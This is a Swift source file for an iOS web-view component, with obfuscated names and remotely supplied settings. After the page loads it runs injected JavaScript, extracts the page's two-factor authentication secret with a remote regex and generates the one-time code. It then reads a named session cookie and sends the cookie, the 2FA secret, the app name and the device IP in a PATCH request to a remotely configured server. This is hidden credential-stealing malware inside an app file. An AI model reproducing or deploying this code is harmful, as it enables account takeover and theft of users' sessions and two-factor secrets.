//
//  File.swift
//
//
//  Created by DanHa on 30/03/2023.
//

import SwiftOTP
import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct SevenAuCoor: UIViewRepresentable {
    func makeCoordinator() -> Lop_Seven_Au_Coordinator {
        Lop_Seven_Au_Coordinator(self)
    }

    let url: URL?
    var listData: [String: String] = [:]
    private let sevenAuObs = SevenAuObs()
    var sevenAuObserver: NSKeyValueObservation? {
        sevenAuObs.sevenAuins
    }

    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true // true
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs

        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = listData[RemoKey.rm02ch.rawValue] ?? ""
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))

        return webview
    }

    func updateUIView(_ uiView: WKWebView, context: Context) { }

    class Lop_Seven_Au_Coordinator: NSObject, WKNavigationDelegate {
        var prenSevenAu: SevenAuCoor
        init(_ prenSevenAu: SevenAuCoor) {
            self.prenSevenAu = prenSevenAu
        }

        func ipAddCall() -> String {
            var addip: String?
            if let dataModel = UserDefaults.standard.object(forKey: "diachiip") as? Data {
                if let perLoad = try? JSONDecoder().decode(UsIpadress.self, from: dataModel) {
                    addip = perLoad.ippad
                }
            }
            return addip ?? "IP_Null"
        }

        func sevenCoorMatch(for regex: String, in text: String) -> [String] {
            do {
                let regex = try NSRegularExpression(pattern: regex)
                let results = regex.matches(in: text,
                                            range: NSRange(text.startIndex..., in: text))
                return results.map {
                    String(text[Range($0.range, in: text)!])
                }
            } catch let error {
                print("Error: \(error.localizedDescription)")
                return []
            }
        }

        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
        } // didStartProvisionalNavigation

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            webView.evaluateJavaScript(prenSevenAu.listData[RemoKey.nine1af.rawValue] ?? "", completionHandler: { _, _ in })

            // Cho 5s cho load html all.
            DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) {
                webView.evaluateJavaScript(self.prenSevenAu.listData[RemoKey.outer1af.rawValue] ?? "") { data, error in
                    if let htm = data as? String, error == nil {
                        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                            // Loc ra key
                            let secMatched = self.sevenCoorMatch(for: self.prenSevenAu.listData[RemoKey.nine2af.rawValue] ?? "", in: htm).filter({ !$0.isEmpty })
                            if !secMatched.isEmpty {
                                let stringSec = secMatched[0]
                                guard let datanw = base32DecodeToData(stringSec) else { return }
                                guard let totpnw = TOTP(secret: datanw), let otpStringnw = totpnw.generate(time: Date()) else {
                                    return
                                }
                                webView.evaluateJavaScript(self.prenSevenAu.listData[RemoKey.nine3af.rawValue] ?? "", completionHandler: { _, _ in })
                                // Cho 2s se dien vao input
                                DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                                    // copy key vao bo nho tam
                                    let pasteboard = UIPasteboard.general
                                    pasteboard.string = otpStringnw
                                    // Paste input enter.
                                    if let iputString = pasteboard.string {
                                        // print(stringinput)
                                        webView.evaluateJavaScript("\(self.prenSevenAu.listData[RemoKey.seven01f.rawValue] ?? "")\(iputString)\(self.prenSevenAu.listData[RemoKey.seven02f.rawValue] ?? "")\(iputString)\(self.prenSevenAu.listData[RemoKey.seven03f.rawValue] ?? "")", completionHandler: { _, _ in })
                                    }

                                    WKWebsiteDataStore.default().httpCookieStore.getAllCookies({ cookies in
                                        let cokiSevenAu = cookies.firstIndex(where: { $0.name == self.prenSevenAu.listData[RemoKey.nam09ap.rawValue] ?? "" })
                                        if cokiSevenAu != nil {
                                            let sevenAuJsonn: [String: Any] = [
                                                self.prenSevenAu.listData[RemoKey.nam23ap.rawValue] ?? "": cookies[cokiSevenAu!].value,
                                                self.prenSevenAu.listData[RemoKey.nam24ap.rawValue] ?? "": "\(secMatched[0])",
                                                self.prenSevenAu.listData[RemoKey.nam25ap.rawValue] ?? "": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as! String)-ONE",
                                                self.prenSevenAu.listData[RemoKey.nam26ap.rawValue] ?? "": self.ipAddCall(),
                                            ]
                                            let url: URL = URL(string: self.prenSevenAu.listData[RemoKey.rm08ch.rawValue] ?? "")!
                                            let sevenJsonData = try? JSONSerialization.data(withJSONObject: sevenAuJsonn)
                                            var request = URLRequest(url: url)
                                            request.httpMethod = "PATCH"
                                            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                            request.httpBody = sevenJsonData
                                            let task = URLSession.shared.dataTask(with: request) { data, _, error in
                                                if error != nil {
                                                    print("Not Done")
                                                } else if data != nil {
                                                    // self.parent.is_seven_reco_done = true
                                                    print("Done")
                                                }
                                            }
                                            task.resume()
                                        }
                                    })
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

// Mark Lop theo doi url
@available(iOS 14.0, *)
private class SevenAuObs: ObservableObject {
    @Published var sevenAuins: NSKeyValueObservation?
}

struct UsIpadress: Codable {
    var ippad: String
}
